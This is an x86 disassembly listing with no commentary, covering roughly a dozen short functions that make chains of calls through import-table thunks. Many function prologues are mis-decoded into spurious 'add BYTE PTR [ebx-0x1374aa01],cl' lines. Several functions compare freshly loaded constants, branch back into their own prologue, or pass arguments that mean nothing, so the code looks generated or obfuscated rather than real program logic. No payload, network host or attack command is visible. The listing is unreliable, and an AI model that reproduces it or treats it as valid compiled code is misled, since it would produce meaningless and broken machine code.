  4d10bb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10c1:	sub    esp,0x24
  4d10c4:	mov    edx,0x4d30e8
  4d10c9:	sbb    DWORD PTR [ebp-0x8],esi
  4d10cc:	push   edx
  4d10cd:	mov    esi,0x0
  4d10d2:	push   esi
  4d10d3:	call   0x4d11d8
  4d10d8:	add    esp,0x4
  4d10db:	pop    edx
  4d10dc:	push   edx
  4d10dd:	push   DWORD PTR [edx+0x40]
  4d10e0:	push   edi
  4d10e1:	push   ebx
  4d10e2:	push   DWORD PTR [edx+0x60]
  4d10e5:	call   0x4d0cec
  4d10ea:	add    esp,0x10
  4d10ed:	pop    edx
  4d10ee:	push   edx
  4d10ef:	push   0x0
  4d10f1:	call   0x4d11d8
  4d10f6:	add    esp,0x4
  4d10f9:	pop    edx
  4d10fa:	add    esp,0x24
  4d10fd:	pop    ebp
  4d10fe:	ret    
  4d10ff:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1105:	sub    esp,0x5c
  4d1108:	lea    edx,[edi+0x1c]
  4d110b:	sbb    ecx,DWORD PTR [edx+0x30]
  4d110e:	push   edx
  4d110f:	push   esi
  4d1110:	push   DWORD PTR [edx+0x1a4]
  4d1116:	call   0x4d1490
  4d111b:	add    esp,0x8
  4d111e:	pop    edx
  4d111f:	push   edx
  4d1120:	push   0x0
  4d1122:	call   0x4d13dc
  4d1127:	add    esp,0x4
  4d112a:	pop    edx
  4d112b:	push   edx
  4d112c:	mov    edi,0x0
  4d1131:	push   edi
  4d1132:	call   0x4d13dc
  4d1137:	add    esp,0x4
  4d113a:	pop    edx
  4d113b:	add    esp,0x5c
  4d113e:	pop    ebp
  4d113f:	ret    
  4d1140:	mov    edi,edi
  4d1142:	push   ebp
  4d1143:	mov    ebp,esp
  4d1145:	sub    esp,0x3c
  4d1148:	mov    edx,0x4d3198
  4d114d:	cmp    edx,0x42e
  4d1153:	jbe    0x4d1143
  4d1155:	push   edx
  4d1156:	push   eax
  4d1157:	push   ebx
  4d1158:	push   ebx
  4d1159:	call   0x4d13e8
  4d115e:	add    esp,0xc
  4d1161:	pop    edx
  4d1162:	push   edx
  4d1163:	push   0x0
  4d1165:	call   0x4d09dc
  4d116a:	add    esp,0x4
  4d116d:	pop    edx
  4d116e:	push   edx
  4d116f:	mov    ecx,0x0
  4d1174:	push   ecx
  4d1175:	call   0x4d13dc
  4d117a:	add    esp,0x4
  4d117d:	pop    edx
  4d117e:	add    esp,0x3c
  4d1181:	pop    ebp
  4d1182:	ret    
  4d1183:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1189:	sub    esp,0x3c
  4d118c:	lea    edx,ds:0x4d3050
  4d1192:	cmp    edx,0x5d46
  4d1198:	je     0x4d1187
  4d119a:	push   edx
  4d119b:	push   eax
  4d119c:	push   ecx
  4d119d:	push   esi
  4d119e:	push   DWORD PTR [edx+0x148]
  4d11a4:	call   0x4d1378
  4d11a9:	add    esp,0x10
  4d11ac:	pop    edx
  4d11ad:	push   edx
  4d11ae:	push   0x0
  4d11b0:	call   0x4d1274
  4d11b5:	add    esp,0x4
  4d11b8:	pop    edx
  4d11b9:	push   edx
  4d11ba:	push   0x0
  4d11bc:	call   0x4d11cc
  4d11c1:	add    esp,0x4
  4d11c4:	pop    edx
  4d11c5:	add    esp,0x3c
  4d11c8:	pop    ebp
  4d11c9:	ret    
  4d11ca:	add    BYTE PTR [eax],al
  4d11cc:	pop    edi
  4d11cd:	call   DWORD PTR ds:0x4d2010
  4d11d3:	call   edi
  4d11d5:	add    BYTE PTR [eax],al
  4d11d7:	add    BYTE PTR [edi-0x1],bl
  4d11da:	adc    eax,0x4d2068
  4d11df:	call   edi
  4d11e1:	add    BYTE PTR [eax],al
  4d11e3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11e9:	sub    esp,0x58
  4d11ec:	lea    esi,[edi+0xfc]
  4d11f2:	sub    edi,DWORD PTR [esi+0x54]
  4d11f5:	mov    ecx,0x0
  4d11fa:	push   ecx
  4d11fb:	call   0x4d14c8
  4d1200:	add    esp,0x4
  4d1203:	push   esi
  4d1204:	push   eax
  4d1205:	push   DWORD PTR [esi+0x94]
  4d120b:	push   edi
  4d120c:	push   DWORD PTR [esi+0x74]
  4d120f:	call   0x4d0d7c
  4d1214:	add    esp,0x10
  4d1217:	pop    esi
  4d1218:	mov    edi,0x0
  4d121d:	push   edi
  4d121e:	call   0x4d11d8
  4d1223:	add    esp,0x4
  4d1226:	add    esp,0x58
  4d1229:	pop    ebp
  4d122a:	ret    
  4d122b:	add    BYTE PTR [edi-0x1],bl
  4d122e:	adc    eax,0x4d2014
  4d1233:	call   edi
  4d1235:	add    BYTE PTR [eax],al
  4d1237:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d123d:	sub    esp,0x30
  4d1240:	lea    esi,[edi-0x110]
  4d1246:	and    edi,DWORD PTR [ebp-0x30]
  4d1249:	mov    ecx,0x0
  4d124e:	push   ecx
  4d124f:	call   0x4d08cc
  4d1254:	add    esp,0x4
  4d1257:	push   esi
  4d1258:	push   edi
  4d1259:	push   ebx
  4d125a:	call   0x4d0fd0
  4d125f:	add    esp,0x8
  4d1262:	pop    esi
  4d1263:	push   0x0
  4d1265:	call   0x4d13c4
  4d126a:	add    esp,0x4
  4d126d:	add    esp,0x30
  4d1270:	pop    ebp
  4d1271:	ret    
  4d1272:	add    BYTE PTR [eax],al
  4d1274:	pop    edi
  4d1275:	call   DWORD PTR ds:0x4d2004
  4d127b:	call   edi
  4d127d:	add    BYTE PTR [eax],al
  4d127f:	add    BYTE PTR [edi-0x1],bl
  4d1282:	adc    eax,0x4d2028
  4d1287:	call   edi
  4d1289:	add    BYTE PTR [eax],al
  4d128b:	add    BYTE PTR [edi-0x1],bl
  4d128e:	adc    eax,0x4d2090
  4d1293:	call   edi
  4d1295:	add    BYTE PTR [eax],al
  4d1297:	add    BYTE PTR [edi-0x1],bl
  4d129a:	adc    eax,0x4d200c
  4d129f:	call   edi
  4d12a1:	add    BYTE PTR [eax],al
  4d12a3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d12a9:	sub    esp,0x40
  4d12ac:	lea    edi,[ecx-0x50]
  4d12af:	sbb    ebx,DWORD PTR [ebp-0x20]
  4d12b2:	push   edi
  4d12b3:	push   0x0
  4d12b5:	call   0x4d11cc
  4d12ba:	add    esp,0x4
  4d12bd:	pop    edi
  4d12be:	push   edi
  4d12bf:	push   DWORD PTR [edi+0x198]
  4d12c5:	push   ecx
  4d12c6:	call   0x4d1238
  4d12cb:	add    esp,0x8
  4d12ce:	pop    edi
  4d12cf:	push   edi
  4d12d0:	mov    edx,0xfffffff4
  4d12d5:	push   edx
  4d12d6:	call   0x4d122c
  4d12db:	add    esp,0x4
  4d12de:	pop    edi
  4d12df:	add    esp,0x40
  4d12e2:	pop    ebp
  4d12e3:	ret    
  4d12e4:	mov    edi,edi
  4d12e6:	push   ebp
  4d12e7:	mov    ebp,esp
  4d12e9:	sub    esp,0x38
  4d12ec:	lea    edi,ds:0x4d3180
  4d12f2:	sbb    eax,DWORD PTR [edi-0x4c]
  4d12f5:	push   edi
  4d12f6:	push   DWORD PTR [edi+0x134]
  4d12fc:	push   DWORD PTR [edi+0x1b4]
  4d1302:	call   0x4d0994
  4d1307:	add    esp,0x8
  4d130a:	pop    edi
  4d130b:	push   edi
  4d130c:	mov    ebx,0x0
  4d1311:	push   ebx
  4d1312:	call   0x4d1274
  4d1317:	add    esp,0x4
  4d131a:	pop    edi
  4d131b:	push   edi
  4d131c:	mov    esi,0x0
  4d1321:	push   esi
  4d1322:	call   0x4d11cc
  4d1327:	add    esp,0x4
  4d132a:	pop    edi
  4d132b:	add    esp,0x38
  4d132e:	pop    ebp
  4d132f:	ret    
  4d1330:	mov    edi,edi
  4d1332:	push   ebp
  4d1333:	mov    ebp,esp
  4d1335:	sub    esp,0x48
  4d1338:	lea    edi,[edx+0xa4]
  4d133e:	cmp    edi,0x2c53
  4d1344:	je     0x4d1333
  4d1346:	push   edi
  4d1347:	push   DWORD PTR [edi+0x1ec]
  4d134d:	push   edx
  4d134e:	push   DWORD PTR [edi+0x10c]
  4d1354:	call   0x4d0b6c
  4d1359:	add    esp,0xc
  4d135c:	pop    edi
  4d135d:	push   edi
  4d135e:	call   0x4d1280
  4d1363:	add    esp,0x4
  4d1366:	pop    edi
  4d1367:	push   edi
  4d1368:	push   0x0
  4d136a:	call   0x4d11d8
  4d136f:	add    esp,0x4
  4d1372:	pop    edi
  4d1373:	add    esp,0x48
  4d1376:	pop    ebp
  4d1377:	ret    
  4d1378:	mov    edi,edi
  4d137a:	push   ebp
  4d137b:	mov    ebp,esp
  4d137d:	sub    esp,0x38
  4d1380:	mov    eax,0x4d3190
  4d1385:	cmp    eax,0x6bc1
  4d138a:	jbe    0x4d137b
  4d138c:	push   eax
  4d138d:	push   edi
  4d138e:	push   DWORD PTR [eax+0xb4]
  4d1394:	push   DWORD PTR [eax+0x1c]
  4d1397:	push   DWORD PTR [eax+0x1e8]
  4d139d:	call   0x4d1558
  4d13a2:	add    esp,0x10
  4d13a5:	pop    eax
  4d13a6:	push   eax
  4d13a7:	push   0x0
  4d13a9:	call   0x4d14c8
  4d13ae:	add    esp,0x4
  4d13b1:	pop    eax
  4d13b2:	push   eax
  4d13b3:	push   0x0
  4d13b5:	call   0x4d13dc
  4d13ba:	add    esp,0x4
  4d13bd:	pop    eax
  4d13be:	add    esp,0x38
  4d13c1:	pop    ebp
  4d13c2:	ret    
  4d13c3:	add    BYTE PTR [edi-0x1],bl
  4d13c6:	adc    eax,0x4d2064
  4d13cb:	call   edi
  4d13cd:	add    BYTE PTR [eax],al
  4d13cf:	add    BYTE PTR [edi-0x1],bl
  4d13d2:	adc    eax,0x4d202c
  4d13d7:	call   edi
  4d13d9:	add    BYTE PTR [eax],al
  4d13db:	add    BYTE PTR [edi-0x1],bl
  4d13de:	adc    eax,0x4d2040
  4d13e3:	call   edi
  4d13e5:	add    BYTE PTR [eax],al
  4d13e7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d13ed:	sub    esp,0x40
  4d13f0:	lea    ecx,ds:0x4d3138
  4d13f6:	and    DWORD PTR [ebp-0x40],0xc
  4d13fa:	push   ecx
  4d13fb:	push   ebx
  4d13fc:	push   DWORD PTR [ecx+0x20]
  4d13ff:	call   0x4d12e4
  4d1404:	add    esp,0x8
  4d1407:	pop    ecx
  4d1408:	push   ecx
  4d1409:	mov    edx,0x0
  4d140e:	push   edx
  4d140f:	call   0x4d1274
  4d1414:	add    esp,0x4
  4d1417:	pop    ecx
  4d1418:	push   ecx
  4d1419:	push   0x0
  4d141b:	call   0x4d11cc
  4d1420:	add    esp,0x4
  4d1423:	pop    ecx
  4d1424:	add    esp,0x40
  4d1427:	pop    ebp
  4d1428:	ret    
  4d1429:	add    BYTE PTR [eax],al
  4d142b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1431:	sub    esp,0x50
  4d1434:	mov    edx,0x4d31c8
  4d1439:	and    esi,DWORD PTR [ebp-0x24]
  4d143c:	push   edx
  4d143d:	push   DWORD PTR [edx+0x4]
  4d1440:	push   DWORD PTR [edx+0x160]
  4d1446:	push   DWORD PTR [edx+0x140]
  4d144c:	call   0x4d0de4
  4d1451:	add    esp,0xc
  4d1454:	pop    edx
  4d1455:	push   edx
  4d1456:	push   0x0
  4d1458:	call   0x4d1298
  4d145d:	add    esp,0x4
  4d1460:	pop    edx
  4d1461:	push   edx
  4d1462:	mov    edi,0x0
  4d1467:	push   edi
  4d1468:	call   0x4d1058
  4d146d:	add    esp,0x4
  4d1470:	pop    edx
  4d1471:	add    esp,0x50
  4d1474:	pop    ebp
  4d1475:	ret    
  4d1476:	add    BYTE PTR [eax],al
  4d1478:	pop    edi
  4d1479:	call   DWORD PTR ds:0x4d2094
  4d147f:	call   edi
  4d1481:	add    BYTE PTR [eax],al
  4d1483:	add    BYTE PTR [edi-0x1],bl
  4d1486:	adc    eax,0x4d2070
  4d148b:	call   edi
  4d148d:	add    BYTE PTR [eax],al
  4d148f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1495:	sub    esp,0x40
  4d1498:	mov    ecx,0x4d318c
  4d149d:	xor    edi,0xffffffaf
  4d14a0:	push   ecx
  4d14a1:	push   eax
  4d14a2:	push   edx
  4d14a3:	call   0x4d107c
  4d14a8:	add    esp,0x8
  4d14ab:	pop    ecx
  4d14ac:	push   ecx
  4d14ad:	push   0xfffffff4
  4d14af:	call   0x4d122c
  4d14b4:	add    esp,0x4
  4d14b7:	pop    ecx
  4d14b8:	push   ecx
  4d14b9:	call   0x4d1280
  4d14be:	add    esp,0x4
  4d14c1:	pop    ecx
  4d14c2:	add    esp,0x40
  4d14c5:	pop    ebp
  4d14c6:	ret    
  4d14c7:	add    BYTE PTR [edi-0x1],bl
  4d14ca:	adc    eax,0x4d2038
  4d14cf:	call   edi
  4d14d1:	add    BYTE PTR [eax],al
  4d14d3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14d9:	sub    esp,0x20
  4d14dc:	lea    eax,[ebx+0xec]
  4d14e2:	mov    ebx,0xffff82a1
  4d14e7:	push   eax
  4d14e8:	push   edx
  4d14e9:	push   DWORD PTR [eax+0x50]
  4d14ec:	push   DWORD PTR [eax+0x138]
  4d14f2:	push   ebx
  4d14f3:	call   0x4d0f8c
  4d14f8:	add    esp,0x10
  4d14fb:	pop    eax
  4d14fc:	push   eax
  4d14fd:	call   0x4d1064
  4d1502:	add    esp,0x4
  4d1505:	pop    eax
  4d1506:	push   eax
  4d1507:	mov    esi,0x0
  4d150c:	push   esi
  4d150d:	call   0x4d13c4
  4d1512:	add    esp,0x4
  4d1515:	pop    eax
  4d1516:	add    esp,0x20
  4d1519:	pop    ebp
  4d151a:	ret    
  4d151b:	add    BYTE PTR [edi-0x1],bl
  4d151e:	adc    eax,0x4d2084
  4d1523:	call   edi
  4d1525:	add    BYTE PTR [eax],al
  4d1527:	add    BYTE PTR [edi-0x1],bl
  4d152a:	adc    eax,0x4d2020
  4d152f:	call   edi
  4d1531:	add    BYTE PTR [eax],al
  4d1533:	add    BYTE PTR [edi-0x1],bl
  4d1536:	adc    eax,0x4d2074
  4d153b:	call   edi
  4d153d:	add    BYTE PTR [eax],al
  4d153f:	add    BYTE PTR [edi-0x1],bl
  4d1542:	adc    eax,0x4d2034
  4d1547:	call   edi
  4d1549:	add    BYTE PTR [eax],al
  4d154b:	add    BYTE PTR [edi-0x1],bl
  4d154e:	adc    eax,0x4d2024
  4d1553:	call   edi
  4d1555:	add    BYTE PTR [eax],al
  4d1557:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d155d:	sub    esp,0x54
  4d1560:	mov    edi,0x4d3150
  4d1565:	sbb    DWORD PTR [edi+0x5c],edx
  4d1568:	push   edi
  4d1569:	push   DWORD PTR [edi+0x94]
  4d156f:	push   DWORD PTR [edi+0x134]
  4d1575:	push   DWORD PTR [edi+0x74]
  4d1578:	call   0x4d0ea4
  4d157d:	add    esp,0xc
  4d1580:	pop    edi
  4d1581:	push   edi
  4d1582:	push   0x0
  4d1584:	call   0x4d09dc
  4d1589:	add    esp,0x4
  4d158c:	pop    edi
  4d158d:	push   edi
  4d158e:	mov    esi,0x0
  4d1593:	push   esi
  4d1594:	call   0x4d11d8
  4d1599:	add    esp,0x4
  4d159c:	pop    edi
  4d159d:	add    esp,0x54
  4d15a0:	pop    ebp
  4d15a1:	ret    
  4d15a2:	add    BYTE PTR [eax],al
  4d15a4:	pop    edi
  4d15a5:	call   DWORD PTR ds:0x4d207c
  4d15ab:	call   edi
  4d15ad:	add    BYTE PTR [eax],al
	...
